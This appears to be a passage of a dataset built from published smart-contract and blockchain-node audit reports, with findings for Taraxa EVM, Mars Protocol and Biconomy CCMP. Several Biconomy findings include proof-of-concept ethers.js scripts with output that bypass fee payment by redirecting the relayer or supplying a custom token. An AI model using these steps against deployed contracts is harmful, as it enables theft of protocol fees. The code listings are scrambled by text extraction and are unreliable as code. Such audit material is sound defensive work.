v0.0.0-20220609144429 v1.0.0-20201130134442 v2.4.0 v3.0.1 Risk Level: Likelihood - 3 Impact - 3 34 M V E A X A R A T Recommendation: Patch or update exposed modules where possible, or reduce the attack surface so that it is impossible for an attacker to exploit this security flaw. Remediation Plan: SOLVED: The Taraxa team solved the issue by applying the proposed recommendation. No vulnerable packages were found on the specified date. bee07cd1316adabb406ab39edfc2cee7d524a840 M V E A X A R A T 35 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Medium"]}, {"title": "ERROR VALUE EVALUATED BUT NOT APPLIED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The affected functions contained error checking in them. However, the errors were not handled properly and allowed the functions to continue to run. Even when the error clauses were modified accordingly, execution was not stopped by return statements. When execution continues after an error, it could take advantage of unexpected behavior in linked functions that could not handle returned errors correctly. Code Location: Listing 11: Taraxa-evm/Common/hexutil/hexutil.go (Lines 67-68,71) if len ( input ) == 0 { return nil , ErrEmptyString } if ! has0xPrefix ( input ) { 59 // Decode decodes a hex string with 0 x prefix . 60 func Decode ( input string ) ([] byte , error ) { 61 62 63 64 65 66 67 68 69 70 71 72 } } b , err := hex . DecodeString ( input [2:]) if err != nil { } return b , err return nil , ErrMissingPrefix err = mapError ( err ) Listing 12: Taraxa-evm/Common/hexutil/hexutil.go (Lines 97-98,101) 92 unc DecodeUint64 ( input string ) ( uint64 , error ) { 93 94 95 raw , err := checkNumber ( input ) if err != nil { return 0, err 36 M V E A X A R A T 96 97 98 99 100 101 102 } } dec , err := strconv . ParseUint ( raw , 16 , 64) if err != nil { err = mapError ( err ) } return dec , err Risk Level: Likelihood - 2 Impact - 2 Recommendation: Evaluate the error clause and apply the return values accordingly. In case an error is discovered, the return value should be adapted, it is recommended not to return the results of the operation. Remediation Plan: SOLVED: The Taraxa team solved the issue by adding a return statement in case an error was detected. b4cedfde975bcd28d56203ecd8d59f75becb5936 M V E A X A R A T 37 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Low"]}, {"title": "NO ERR VARIABLE EVALUATION PRIOR TO AN OPERATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The err value of a function was not evaluated before an operation. If this error value is not evaluated properly, the value returned from the function could lead to multiple security issues, such as Out-of-Bounds and several unexpected states. Code Location:  Taraxa-evm/core/vm/evm.go Listing 13: Taraxa-evm/core/vm/evm.go (Lines 295,297) 291 // initialise a new contract and set the code that is to be used  by the 292 // EVM . The contract is a scoped environment for this  execution context // only . contract := NewContract ( CallFrame { caller , new_acc , nil , gas , 293 294  value }, code ) 295 296 297 ret , err = self . run (& contract , false ) // check whether the max code size has been exceeded maxCodeSizeExceeded := self . rules . IsEIP158 && len ( ret ) >  MaxCodeSize 298 // if the contract creation ran successfully and no errors  were returned 299 // calculate the gas required to store the code . If the code  could not 300 // be stored due to not enough gas set an error and let it be  handled 301 302 303 304 305 // by the error checking condition below . if err == nil && ! maxCodeSizeExceeded { createDataGas := uint64 ( len ( ret )) * CreateDataGas if contract . UseGas ( createDataGas ) { new_acc . SetCode ( ret ) 38 M V E A X A R A T 306 307 308 309 } else { err = ErrCodeStoreOutOfGas } } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Evaluate the return value before executing any operations on the return values. Remediation Plan: SOLVED: The Taraxa team solved the issue by checking the err value returned by certain operations. fd07c57c0861a5e967b8710c2ec610a1601ba374 M V E A X A R A T 39 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Low"]}, {"title": "IMPLICIT MEMORY ALIASING IN LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The ApplyDAOHardFork function contains a for loop in which the memory of the addr loop variable is accessed. At each iteration, the value of the next element in the range expression was assigned to the iteration variable; addr did not change, it just changes the value. Therefore, the expression &v referred to the same location in memory. Code Location:  Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract.go  Taraxa-evm/consensus/misc/dao.go Listing 14: Taraxa-evm/consensus/misc/dao.go (Line 31) // Move every DAO account and extra - balance account funds into refund_acc := db . GetAccount (& DAORefundContract ) for _ , addr := range DAODrainList () { 27 func ApplyDAOHardFork ( db vm . State ) { 28  the refund contract 29 30 31 32 33 34 35 36 } acc := db . GetAccount (& addr ) bal := acc . GetBalance () refund_acc . AddBalance ( bal ) acc . SubBalance ( bal ) } Risk Level: Likelihood - 1 Impact - 1 M V E A X A R A T 40 Recommendation: Index the ranged map. This takes the address of the actual element at the i-th position, rather than the iteration variable. Listing 15: Recommended example 1 drainlist = DAODrainList () 2 for i := range drainlist { 3 4 5 6 7 acc := db . GetAccount (& drainlist [ i ]) bal := acc . GetBalance () refund_acc . AddBalance ( bal ) acc . SubBalance ( bal ) } Remediation Plan: PARTIALLY SOLVED: The Taraxa team partially solved the issue by removing the Taraxa-evm/consensus/misc/dao.go file, but there were still instances of this issue in Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract .go. M V E A X A R A T 41 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Informational"]}, {"title": "LACK OF DEFAULT CLAUSE ON SWITCH STATEMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The lack of the Default clause in a Switch statement cannot be considered as a security flaw itself. However, using non-standard practices in the code could lead to unhandled errors, making the code unsafe. See the Lack of Return Error issue. Code Location:  Taraxa-evm/accounts/abi/abi.go Listing 16: Taraxa-evm/accounts/abi/abi.go (Lines 110,111,116,123) } var fields [] struct { [] Argument [] Argument string Type string Name bool Constant Anonymous bool Inputs Outputs 92 // UnmarshalJSON implements json . Unmarshaler interface 93 func ( abi * ABI ) UnmarshalJSON ( data [] byte ) error { 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 abi . Methods = make ( map [ string ] Method ) abi . Events = make ( map [ string ] Event ) for _ , field := range fields { abi . Constructor = Method { Inputs : field . Inputs , switch field . Type { case \" constructor \" : return err } if err := json . Unmarshal ( data , & fields ); err != nil { 42 M V E A X A R A T 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 } // empty defaults to function according to the abi spec case \" function \" , \" \": abi . Methods [ field . Name ] = Method { Name : Const : Inputs : Outputs : field . Outputs , field . Name , field . Constant , field . Inputs , } case \" event \" : abi . Events [ field . Name ] = Event { field . Name , Name : Anonymous : field . Anonymous , Inputs : field . Inputs , } } } return nil   Taraxa-evm/accounts/abi/argument.go:unpack  Taraxa-evm/accounts/abi/reflect.go:reflectIntKindAndType  Taraxa-evm/common/hexutil/hexutil.go:mapError  Taraxa-evm/vm/evm.go:run  Taraxa-evm/vm/opcodes.go:IsPush  Taraxa-evm/rlp/decode.go:wrapStreamError  Taraxa-evm/rlp/decode.go:decodeByteArray  Taraxa-evm/rlp/raw.go:readSize  Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract.go: RequiredGas  Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract.go:Run  Taraxa-evm/taraxa/trie/writer.go:commit  Taraxa-evm/taraxa/trie/writer.go:mpt_insert  Taraxa-evm/taraxa/trie/writer.go:mpt_del  Taraxa-evm/taraxa/util/util.go:IsReallyNil  Taraxa-evm/taraxa/util/bin/index.go:DEC_b_endian_compact_64 M V E A X A R A T 43 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Include the default clause to cover the Switch statement with all options, catching unexpected behaviors that could be triggered in the function. Remediation plan: The in SOLVED: issue ae19c9931b1dc7f8e8eb1e1a8ab313bb6b853caa Taraxa team commits solved by e634895136bccf651e7dbf1cf965c88f14238752 affected several files this and 44 M V E A X A R A T 5.10 (HAL-13) INSECURE RANDOM NUMBER GENERATOR - INFORMATIONAL ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Informational"]}, {"title": "MULTIPLE CONSEQUENCES WHEN INTERACTING WITH UPPER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When users deposit, withdraw, borrow or repay in contracts/mars-red- bank/src/contract.rs using on_behalf_of / recipient_address address in upper case (e.g.: TERRA1KG. . . XNL8), the following consequences occur:  Deposited tokens cannot be used to borrow.  Recipient cannot use his withdrawn tokens.  Recipient cannot use his borrowed tokens.  Repaying will throw error messages. These issues happen because the values are stored in contracts storage with the upper case address as a key, which creates conflicts when values are loaded using info.sender as a key, which is always in lower case (e.g.: terra1kg. . . xnl8). Code Location: Listing 1: Resources affected 1 2 3 4 mars - red - bank : execute_deposit ( on_behalf_of ) mars - red - bank : execute_withdraw ( recipient_address ) mars - red - bank : execute_borrow ( recipient_address ) mars - red - bank : execute_repay ( on_behalf_of ) Risk Level: Likelihood - 4 Impact - 4 11 Recommendation: Update the logic of functions mentioned above to turn recipient addresses into lower case. Remediation plan: PENDING: The Mars team stated that in the short term they would analyze how to address this issue comprehensively on the protocol. 12 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm", "Severity: High"]}, {"title": "EQUIVALENCE BETWEEN MARS AND XMARS TOKENS CAN BE BROKEN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_create_allocation function in contracts/mars-vesting/src/contra- ct.rs relies on the equivalence between Mars and xMars tokens remains true, i.e.: 1 Mars = 1 xMars. However, this equivalence can be broken if a malicious user transfers Mars tokens to mars-staking contract. As a consequence, execute_create_allocation function cannot be called, i.e.: a Denial-of-Service (DoS) that could even be permanent. It is worth noting that the likelihood for this to happen is low because allocations are created at one of the phases of protocol launch where Mars tokens have not been distributed to anyone but the multisig wallet. Code Location: Listing 2: contracts/mars-staking/src/contract.rs (Lines 544-548) 535 fn get_staking_tokens_info ( deps : Deps , 536 env : & Env , 537 config : & Config , 538 global_state : & GlobalState , 539 540 mars_to_deduct : Uint128 , 541 ) -> StdResult < StakingTokensInfo > { 542 let ( mars_token_address , xmars_token_address ) = 543 544 545 546 547 548 549 get_token_addresses ( deps , config ) ?; let total_mars_in_staking_contract = cw20_get_balance ( & deps . querier , mars_token_address . clone () , env . contract . address . clone () , )? . checked_sub ( mars_to_deduct ) ?; 13 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Fix the logic of get_staking_tokens_info function to update and store the amount of Mars tokens owned by mars-staking contract in its storage when staking / unstaking, instead of relying on Mars token balance. Remediation plan: RISK ACCEPTED: The Mars team accepted the risk for this finding. They also stated that the check in mars-vesting contract is a guarantee that they wont create more allocations for the contract and that the voting power given to this Mars token is fair. 14 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm", "Severity: Low"]}, {"title": "FEE PAYMENT BYPASS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The CCMP protocol uses an internal struct sent inside the messages to determine the fee amount, the token used to pay it, and the relayer who will receive the fee. As this struct is filled by the user and sent in his message, it is possible to modify the relayer address by the users to pay fees to themselves. Code Location: Listing 1: CrossChainMessage.sol 14 struct GasFeePaymentArgs { 15 16 17 18 } address feeTokenAddress ; uint256 feeAmount ; address relayer ; Listing 2: CCMPSendMessageFacet.sol (Line 94) uint256 feeAmount = _message . gasFeePaymentArgs . feeAmount ; address relayer = _message . gasFeePaymentArgs . relayer ; address tokenAddress = _message . gasFeePaymentArgs . 92 function _handleFee ( CCMPMessage memory _message ) internal { 93 94 95  feeTokenAddress ; 96 97 98  NATIVE_ADDRESS ) { 99 100 101 102 if ( _message . gasFeePaymentArgs . feeTokenAddress == } ( bool success , bytes memory returndata ) = relayer . call revert NativeAmountMismatch () ; if ( msg . value != feeAmount ) { if ( feeAmount >= 0) {  { 103 104 value : msg . value }( \" \"); 15 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 } if (! success ) { revert NativeTransferFailed ( relayer , returndata ); } } else { IERC20 ( _message . gasFeePaymentArgs . feeTokenAddress ) . safeTransferFrom ( _message . sender , relayer , _message . gasFeePaymentArgs . feeAmount ); } } emit FeePaid ( tokenAddress , feeAmount , relayer ); Proof of Concept:  Deploy a ICCMPGateway using the owner address.  modify the gasFeePaymentArgs.relayer variable with the user address.  Execute modified ICCMPGateway.sendMessage() function with the gasFeePaymentArgs. Listing 3: feeBypass.js 1 gasFeePaymentArgs . relayer = relayer . address ; 2 3 // initial balances 4 console . log ( \" FEE -> \" + ethers . utils . formatEther ( gasFeePaymentArgs  . feeAmount )) 5 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 6 7 // paying fees correctly 8 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs , 9 10 11 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 12 { value : gasFeePaymentArgs . feeAmount }) ; 16 13 // change relayer to owner 14 gasFeePaymentArgs . relayer = owner . address ; 15 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs , 16 17 18 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) { value : gasFeePaymentArgs . feeAmount }) Listing 4: Console Output 1 FEE -> 100.0 2 Owner ETH -> 9999.98221086197086311 3 Owner ETH -> 9899.982088081765816406 4 Owner ETH -> 9899.98198524440481391 Risk Level: Likelihood - 5 Impact - 4 Recommendation: Validating the relayer address before fee transfer is recommended. Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this finding and implemented an off-chain service to correctly validate the payment to a whitelisted relayer address before sending the message. 17 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: High"]}, {"title": "USING ARBITRARY TOKENS ALLOW FEE PAYMENT BYPASS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The CCMP protocol uses an internal struct sent inside the messages to determine the fee amount, the token used to pay it, and the relayer who will receive the fee. As this struct is filled by the user and sent in his message, it is possible to modify the feeTokenAddress address and use an arbitrary token with a custom implementation of the transferFrom() function to avoid paying fees. Code Location: Listing 5: CrossChainMessage.sol 14 struct GasFeePaymentArgs { 15 16 17 18 } address feeTokenAddress ; uint256 feeAmount ; address relayer ; Listing 6: CCMPSendMessageFacet.sol (Line 94) uint256 feeAmount = _message . gasFeePaymentArgs . feeAmount ; address relayer = _message . gasFeePaymentArgs . relayer ; address tokenAddress = _message . gasFeePaymentArgs . 92 function _handleFee ( CCMPMessage memory _message ) internal { 93 94 95  feeTokenAddress ; 96 97 98  NATIVE_ADDRESS ) { 99 100 101 102 if ( _message . gasFeePaymentArgs . feeTokenAddress == } ( bool success , bytes memory returndata ) = relayer . call revert NativeAmountMismatch () ; if ( msg . value != feeAmount ) { if ( feeAmount >= 0) {  { 103 value : msg . value 18 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 } }( \" \"); if (! success ) { revert NativeTransferFailed ( relayer , returndata ); } } else { IERC20 ( _message . gasFeePaymentArgs . feeTokenAddress ) . safeTransferFrom ( _message . sender , relayer , _message . gasFeePaymentArgs . feeAmount ); } } emit FeePaid ( tokenAddress , feeAmount , relayer ); Proof of Concept:  Deploy a ICCMPGateway using the owner address.  Deploy an arbitrary ERC20 token.  modify the gasFeePaymentArgs.feeTokenAddress variable with the token address.  Execute ICCMPGateway.sendMessage() function with the modified gasFeePaymentArgs. Listing 7: feeBypass.js 1 // deploying , minting and approving evil token 2 let evilToken = await ( await ( await ethers . getContractFactory ( \"  EvilToken \")). deploy () ). deployed () ; 3 await evilToken . mint ( parseUnits ( \" 1000000 \" , 18) ); 4 await evilToken . approve ( CCMPGateway . address , gasFeePaymentArgs .  feeAmount . mul (2) ); 5 6 // initial balances 7 console . log ( \" FEE -> \" + ethers . utils . formatEther ( gasFeePaymentArgs  . feeAmount )) 8 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 9 console . log ( \" Owner evil token -> \" + ethers . utils . formatEther ( 19  await evilToken . balanceOf ( owner . address )) ) 10 11 // sending message with standard token 12 gasFeePaymentArgs . feeTokenAddress = Token . address ; 13 14 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs ); 15 16 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 17 18 // sending message with evil token 19 gasFeePaymentArgs . feeTokenAddress = evilToken . address ; 20 21 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs ); 22 23 console . log ( \" Owner evil token -> \" + ethers . utils . formatEther (  await evilToken . balanceOf ( owner . address )) ) Listing 8: Console Output 1 FEE -> 100.0 2 Owner token -> 1000000.0 3 Owner evil token -> 1000000.0 4 Owner token -> 999900.0 5 Owner evil token -> 1000000.0 Risk Level: Likelihood - 4 Impact - 4 Recommendation: Accepting native or well-known ERC20 tokens as fee payment tokens is recommended. 20 Remediation Plan: RISK ACCEPTED: The Biconomy team will accept any token. Still, they have implemented an off-chain service to validate that the fee payment has been correctly received before sending the message. 21 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: High"]}, {"title": "UN HANDLED SITUATION ALLOWS TWICE FEE PAYMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When the CCMP protocol sends a message, an auxiliary function handles the fee payment. This function determines whether the payment is made via native ETH or ERC20 token. Suppose a user tries to send a message with native ETH, but the address added in the gasFeePaymentArgs struct is a valid ERC20 token address. In that case, the protocol will take the ETH sent as value and the token amount marked on gasFeePaymentArgs.feeAmount. Code Location: Listing 9: CCMPSendMessageFacet.sol (Line 94) uint256 feeAmount = _message . gasFeePaymentArgs . feeAmount ; address relayer = _message . gasFeePaymentArgs . relayer ; address tokenAddress = _message . gasFeePaymentArgs . 92 function _handleFee ( CCMPMessage memory _message ) internal { 93 94 95  feeTokenAddress ; 96 97 98  NATIVE_ADDRESS ) { 99 100 101 102 if ( _message . gasFeePaymentArgs . feeTokenAddress == } ( bool success , bytes memory returndata ) = relayer . call revert NativeAmountMismatch () ; if ( msg . value != feeAmount ) { if ( feeAmount >= 0) {  { 103 104 105 106 107 108 109 110 111 112 value : msg . value }( \" \"); if (! success ) { revert NativeTransferFailed ( relayer , returndata ); } } else { IERC20 ( _message . gasFeePaymentArgs . feeTokenAddress ) . safeTransferFrom ( _message . sender , relayer , 22 113 114 115 116 117 118 119 } _message . gasFeePaymentArgs . feeAmount ); } } emit FeePaid ( tokenAddress , feeAmount , relayer ); Proof of Concept:  Deploy a ICCMPGateway using the owner address.  modify the gasFeePaymentArgs.feeTokenAddress variable with a token address.  Execute ICCMPGateway.sendMessage() function with the modified gasFeePaymentArgs. Listing 10: feeBypass.js 1 // initial balances 2 console . log ( \" FEE -> \" + ethers . utils . formatEther ( gasFeePaymentArgs  . feeAmount )) 3 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 4 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 5 6 // sending message with ERC20token 7 gasFeePaymentArgs . feeTokenAddress = Token . address ; 8 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs ); 9 10 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 11 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 12 13 // sending message with ERC20 token and ETH 14 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs , 15 { value : gasFeePaymentArgs . feeAmount }) ; 16 23 17 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 18 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) Listing 11: Console Output 1 FEE -> 100.0 2 Owner ETH -> 9999.984234153287750867 3 Owner token -> 1000000.0 4 Owner ETH -> 9999.984087518824239997 5 Owner token -> 999900.0 6 Owner ETH -> 9899.983963765455794609 7 Owner token -> 999800.0 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to check the msg.value is 0 when ERC20 tokens are used as payment. Remediation Plan: SOLVED: The Biconomy team now checks that the native balance is 0 in case the user is paying with another token. 24 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: Medium"]}, {"title": "CONTRACT OWNER AND PAUSER CAN RENOUNCE HIMSELF", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Owner of the contract is usually the account that deploys the contract. The ICCMPGateway smart contract, Only Owner and Pauser can perform some privileged actions such as setCCMPGateway, setCCMPExecutor, pause etc., the transferOwnership() and setPauser() functions are used to change the Owner and Pauser. Suppose an Owner or Pauser is mistakenly changed to the contract address. In that case, administrative access will result in the contract having no Owner or Pauser, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. Code Location: Listing 12: ownable.sol (Lines 62,71,80) function renounceAdmin () public virtual function renounceOwnership () public virtual onlyOwner { _transferOwnership ( address (0) ) ; } /* * 61 62 63 64 65 66 67  ( ` newOwner `) . 68 69 70  onlyOwner { 71  zero address \" ); 72 73 74 75 76  ( ` newOwner `) . /* * } * @dev Transfers ownership of the contract to a new account * Can only be called by the current owner . */ function transferOwnership ( address newOwner ) public virtual require ( newOwner != address (0) , \" Ownable : new owner is the _transferOwnership ( newOwner ); * @dev Transfers ownership of the contract to a new account 25 77 78 79  { 80 81 82 83 * Internal function without access restriction . */ function _transferOwnership ( address newOwner ) internal virtual address oldOwner = _owner ; _owner = newOwner ; emit OwnershipTransferred ( oldOwner , newOwner ); } Listing 13: CCMPConfigurationFacet.sol (Line 77) 75 76 77 78 79 function setPauser ( address _pauser ) external { LibDiamond . _enforceIsContractOwner () ; LibDiamond . _diamondStorage () . pauser = _pauser ; emit PauserUpdated ( _pauser ); } Proof of Concept:  Deploy a ICCMPGateway using the owner address.  Execute ICCMPGateway.setPauser() function with the contract address as parameter.  Execute ICCMPGateway.transferOwnership() function with the contract address as parameter. Risk Level: Likelihood - 2 Impact - 3 Recommendations: It is recommended that the contract Owner cannot set new Pausers or Owners without checking the address before. In addition, if a multi-signature wallet is used, calling the transferOwnership() and setPauser() functions should be confirmed for two or more users. 26 Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this finding. 27 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There is no validation of the addresses in the contractor() of the Adaptors like WormholeAdaptor, AxelarAdaptor or AbacusAdapter, and other Addresses should be validated and checked that are smart contracts. different from zero when necessary. This issue is present in all the smart contracts, in the constructors and functions that use addresses as parameters. These examples show how the factory could be set up with a wrong address and how mint could burn NFTs if _owner is address(0) Some code location examples: Listing 14: AxelarAdaptor.sol address _axelarGateway , address _ccmpGateway , address _pauser ) CCMPAdaptorBase ( _ccmpGateway , _pauser ) { axelarGateway = IAxelarGateway ( _axelarGateway ); 55 constructor ( 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 // Setup Mainnet Chain ID to Names chainIdToName [1313161554] = \" aurora \"; chainIdToName [43114] = \" Avalanche \" ; chainIdToName [56] = \" binance \" ; chainIdToName [1] = \" Ethereum \" ; chainIdToName [250] = \" Fantom \" ; chainIdToName [1284] = \" Moonbeam \" ; chainIdToName [137] = \" Polygon \"; // Setup Testnet Chain ID to Names chainIdToName [1313161555] = \" aurora \"; chainIdToName [43113] = \" Avalanche \" ; chainIdToName [97] = \" binance \" ; chainIdToName [3] = \" Ethereum \" ; chainIdToName [4002] = \" Fantom \"; chainIdToName [1287] = \" Moonbeam \" ; 28 78 79 } chainIdToName [80001] = \" Polygon \" ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: Validate that necessary address inputs are different from zero. Remediation Plan: SOLVED: The Biconomy team implemented verifications to check if the parameters in the constructor are equal to address(0). 29 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: Low"]}, {"title": "DIFFERENT PRAGMA VERSIONS USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The CCMP smart contracts use floating pragma and different pragma versions, like >=0.6.11. Latest pragma version 0.8.16 released on August 8th, 2022, is used in some contracts, but 0.8.0 is also used. Avoid using floating pragma is recommended as best practices. Reference: Solidity Releases Code Location:  >=0.6.11 (contracts/adaptors/base/AbacusConnectionClient.sol#2)  ^0.8.0 (contracts/gateway/facets/DiamondInit.sol#2)  ^0.8.0 (contracts/gateway/facets/DiamondLoupeFacet.sol#2)  ^0.8.0 (contracts/interfaces/IAxelarGateway.sol#3)  ^0.8.0 (contracts/interfaces/ICCMPGateway.sol#2)  0.8.16 (contracts/interfaces/ICCMPRouterAdaptor.sol#2)  ^0.8.0 (contracts/interfaces/IDiamond.sol#2)  ^0.8.0 (contracts/interfaces/IDiamondCut.sol#2)  ^0.8.0 (contracts/interfaces/IDiamondLoupe.sol#2)  ^0.8.0 (contracts/interfaces/IERC165.sol#2)  ^0.8.0 (contracts/interfaces/IERC173.sol#2)  ^0.8.0 (contracts/interfaces/IWormhole.sol#4)  ^0.8.16 (contracts/libraries/LibDiamond.sol#2)  ^0.8.0 (contracts/mock/MockWormhole.sol#4)  ^0.8.0 (contracts/structures/CrossChainMessage.sol#2)  ^0.8.0 (contracts/structures/Wormhole.sol#4) Note: The contracts with version 0.8.16 are not shown in the list. 30 Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to update the pragma versions used in the CCMP smart contracts and lock them on the used version 0.8.16. Remediation Plan: SOLVED: The Biconomy team now uses Solidity version 0.8.16 in their contracts. 31 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: Informational"]}, {"title": "GAS OPTIMIZATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Pausable.sol contract contains several functions that could be marked as external instead of public in order to save gas. Listing 15: Pausable.sol function changePauser ( address newPauser ) public onlyPauser 58  whenNotPaused { 59 60 } _changePauser ( newPauser ); Listing 16: Pausable.sol 77 78 79 80 81 82 83 function pause () public onlyPauser { _pause () ; } function unpause () public onlyPauser { _unpause () ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to change the public visibility of the mentioned functions to external to save gas. 32 Remediation Plan: SOLVED: The Biconomy team implemented the mentioned functions as external instead of public. 33 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: Informational"]}, {"title": "OPEN TODOs", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Open To-dos can point to architecture or programming issues that still need to be resolved. Often these kinds of comments indicate areas of complexity or confusion for developers. This provides value and insight to an attacker who aims to cause damage to the protocol. Code Location: TO-DO: Listing 17: Open ToDOs 1 CCMPReceiverMessageFacet . sol # L1 2 CrossChainMessage . sol # L7 3 CrossChainMessage . sol # L53 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider resolving the To-dos before deploying code to a production context. Use an independent issue tracker or other project management software to track development tasks. Remediation Plan: ACKNOWLEDGED: The Biconomy team acknowledged this finding. 34 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: Informational"]}, {"title": "INCREASE OPTIMIZER RUNS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Solidity 0.8.2 and 0.8.16 have good optimizers that save a gas when compiling to bytecode. The team can use it by increasing the number of runs to something like 2000 at least in the config. Risk Level: Likelihood - 1 Impact - 1 Code Location: Listing 18: hsrdhat.config.ts (Lines 27,41) compilers : [ { 15 solidity : { 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 }, { }, version : \" 0.8.2 \" , settings : { outputSelection : { \"* \" : { \" 